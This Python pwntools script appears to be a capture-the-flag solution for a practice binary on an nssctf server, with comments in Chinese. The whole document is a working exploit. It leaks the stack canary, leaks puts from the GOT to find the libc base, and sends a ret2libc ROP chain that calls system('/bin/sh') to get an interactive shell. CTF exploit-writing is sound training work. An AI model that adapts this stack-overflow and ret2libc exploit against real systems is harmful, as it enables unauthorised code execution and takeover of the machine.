from pwn import *

context(arch='amd64', os='linux', log_level='debug')

p = remote("node4.anna.nssctf.cn", 27526)
elf = ELF('./pwn')

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
pop_rdi_ret = 0x400863
main_addr = 0x400789
ret_addr  = 0x40059e

# libc6_2.27-3ubuntu1.3_amd64
OFF_PUTS   = 0x80aa0
OFF_SYSTEM = 0x4f550
OFF_BINSH  = 0x1b3e1a


def leak_canary():
    """填满 0x48 字节，sendline 的 \\n 覆盖 canary LSB(\\x00)，
       printf 打印时带出 canary 其余 7 字节。"""
    padding = b'a' * (0x50 - 8)
    p.sendline(padding)
    p.recvline()                               # 接收 'a'*0x48
    canary = u64(p.recv(7).rjust(8, b'\x00'))
    log.success("canary: " + hex(canary))
    return canary


# ---- 第一轮：泄露 canary + libc ----
p.recvuntil(b'overflow?\n')
canary = leak_canary()

# ---------- 泄露 puts ----------
payload = flat(
    b'a' * (0x50 - 8),
    canary,
    b'a' * 8,
    pop_rdi_ret,
    puts_got,
    puts_plt,
    main_addr
)
p.sendline(payload)

# [FIX] 关键：leak_canary 的 printf 输出里含有 saved_rbp（栈地址，也带 0x7f），
# 必须先用 recvuntil 跳过这些残留数据 + "I hope you win\\n"，才能让下面的
# recvuntil(b'\\x7f') 定位到正确的 puts 泄露地址。
p.recvuntil(b'I hope you win\n')

leak_puts = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
log.success("puts leak: " + hex(leak_puts))

# 收掉泄露后的 \\n 和 main 的欢迎信息
p.recvuntil(b'overflow?\n')

libc_base   = leak_puts - OFF_PUTS
sys_addr    = libc_base + OFF_SYSTEM
bin_sh_addr = libc_base + OFF_BINSH
log.success("libc base: " + hex(libc_base))

# ---------- 第二轮：再次 leak canary（作为协议同步，vuln 读两次）+ getshell ----------
# canary 值是线程级 TLS，全程不变，但这里仍需走一轮 read/printf/read 协议
canary = leak_canary()

payload = flat(
    b'a' * (0x50 - 8),
    canary,
    b'a' * 8,
    ret_addr,            # 栈对齐
    pop_rdi_ret,
    bin_sh_addr,
    sys_addr,
)
p.sendline(payload)
p.interactive()
